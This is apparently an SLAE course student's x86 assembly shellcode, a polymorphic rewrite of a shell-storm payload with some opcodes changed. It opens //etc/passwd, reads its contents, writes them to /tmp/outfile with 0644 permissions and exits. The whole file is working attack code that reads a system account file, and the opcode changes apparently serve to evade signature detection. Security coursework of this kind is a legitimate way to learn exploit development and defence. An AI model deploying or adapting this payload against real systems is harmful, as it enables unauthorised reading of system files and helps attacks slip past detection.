; Student:   SLAE-755
; http://shell-storm.org/shellcode/files/shellcode-864.php


global _start
section .text
_start:
    xor    eax,eax
    push   eax
    mov al,0x5


    ; python -c "print '\x64\x77\x73\x73\x61\x70\x2f\x63\x74\x65\x2f\x2f'"
    ; dwssap/cte//
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    mov ebx, esp
    int 0x80


    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    ; EAX=0x3 read syscall 
    int 0x80
    mov esi,eax

    mov eax, 0x5
    mov ecx, 0x5
    sub ecx,eax
    push ecx

    ;eliftuo/pmt/
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f

    ;some opcodes changed here
    push esp
    pop ebx
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    ;some opcodes changed here
    mov ebx,eax
    mov eax, 0x4
    ;push 0x4
    ;pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    ;some opcodes changed here
    xor eax,eax
    mov ebx,eax
    inc al
    add bl,0x5
    int 0x80
